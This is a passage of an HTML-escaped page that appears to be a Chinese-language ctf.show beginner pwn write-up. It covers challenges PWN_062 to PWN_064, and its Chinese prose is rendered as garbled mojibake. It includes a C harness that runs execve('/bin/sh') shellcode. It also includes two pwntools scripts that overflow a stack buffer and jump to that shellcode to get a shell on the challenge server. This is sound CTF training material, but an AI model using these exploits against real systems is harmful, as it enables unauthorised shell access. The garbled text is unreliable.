&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// char code[] = &amp;#34;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;len:%d bytes&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)())&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;          
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28310&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_x64&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#https://www.exploit-db.com/shellcodes/43550&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf_address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode_x64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_063&#34;&gt;PWN_063
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šåˆçŸ­äº†ä¸€ç‚¹ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_063&#34; &gt;PWN_063&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼Œä¸å¤šè¯´ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213.png&#34;
	width=&#34;750&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213_hu_37ebbc241cc091a6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/213_hu_3ce05ff41c169de6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;326&#34;
		data-flex-basis=&#34;782px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA64ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214.png&#34;
	width=&#34;683&#34;
	height=&#34;320&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214_hu_d91ab9a7582c983b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/214_hu_9fd2b425b225cc2b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;213&#34;
		data-flex-basis=&#34;512px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡æ›´ç‹ äº†ï¼Œreadåªè¯»å–55é•¿åº¦äº†&amp;hellip;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯è¿™ä¸ªç½‘ç«™ï¼Œæ‰¾ä¸€ä¸ª23å­—èŠ‚çš„shellcodeğŸ˜„ã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28183&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode_x64&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#https://www.exploit-db.com/exploits/36858&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf_address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode_x64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å»ºè®®å¯ä»¥æŠŠä¸€äº›é•¿åº¦è¾ƒçŸ­çš„shellcodeä¿å­˜åˆ°æ¡Œé¢ï¼Œä¸‹æ¬¡é‡åˆ°æ–­ç½‘çš„çº¿ä¸‹èµ›å°±å¯ä»¥ç›´æ¥å¥—ç”¨äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_064&#34;&gt;PWN_064
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæœ‰æ—¶å€™å¼€å¯æŸç§ä¿æŠ¤å¹¶ä¸ä»£è¡¨è¿™æ¡è·¯ä¸é€šã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_064&#34; &gt;PWN_064&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215.png&#34;
	width=&#34;820&#34;
	height=&#34;201&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215_hu_85ff8b3cf65352ea.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/215_hu_aae5ea8ee9e2b917.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;407&#34;
		data-flex-basis=&#34;979px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA32åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216.png&#34;
	width=&#34;640&#34;
	height=&#34;350&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216_hu_13386c853c3b0f6d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/216_hu_dac7daa91c634eb8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
